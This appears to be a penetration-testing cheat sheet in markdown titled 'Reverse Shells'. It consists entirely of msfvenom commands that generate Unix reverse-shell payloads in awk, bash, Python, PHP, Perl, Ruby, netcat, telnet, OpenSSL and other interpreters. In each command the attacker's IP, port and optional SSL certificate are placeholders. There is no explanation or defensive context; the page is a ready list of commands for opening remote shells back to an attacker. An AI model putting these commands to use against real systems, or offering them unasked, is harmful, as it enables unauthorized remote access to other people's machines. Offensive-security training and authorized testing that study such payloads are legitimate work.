# Reverse Shells

## Awk

`$ msfvenom -p cmd/unix/reverse_awk lhost=<IP> lport=<PORT>`

## Bash

`$ msfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<PORT>`

`$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`

`$ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>`

## Python

`$ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>`

`$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`

## PHP

`$ msfvenom -p cmd/unix/reverse_php_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`

## Perl

`$ msfvenom -p cmd/unix/reverse_perl lhost=<IP> lport=<PORT>`

`$ msfvenom -p cmd/unix/reverse_perl_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`

## SSH

`$ msfvenom -p cmd/unix/reverse_ssh lhost=<IP> lport=<PORT>`

## OpenSSL

`$ msfvenom -p cmd/unix/reverse_openssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`

## Zsh

`$ msfvenom -p cmd/unix/reverse_zsh lhost=<IP> lport=<PORT>`

## Ksh

`$ msfvenom -p cmd/unix/reverse_ksh lhost=<IP> lport=<PORT>`

## Ruby

`$ msfvenom -p cmd/unix/reverse_ruby lhost=<IP> lport=<PORT>`

`$ msfvenom -p cmd/unix/reverse_ruby_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`

## Java

`$ msfvenom -p cmd/unix/reverse_jjs lhost=<IP> lport=<PORT>`

## Lua

`$ msfvenom -p cmd/unix/reverse_lua lhost=<IP> lport=<PORT>`

`$ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`

## Tclsh

`$ msfvenom -p cmd/unix/reverse_tclsh lhost=<IP> lport=<PORT>`

## R

`$ msfvenom -p cmd/unix/reverse_r lhost=<IP> lport=<PORT>`

## Netcat

### OpenBSD Method

`$ msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<PORT>`

### Traditional GNU Method

`$ msfvenom -p cmd/unix/reverse_netcat_gaping lhost=<IP> lport=<PORT>`

`$ msfvenom -p cmd/unix/pingback_reverse lhost=<IP> lport=<PORT>`

## Telnet

`$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`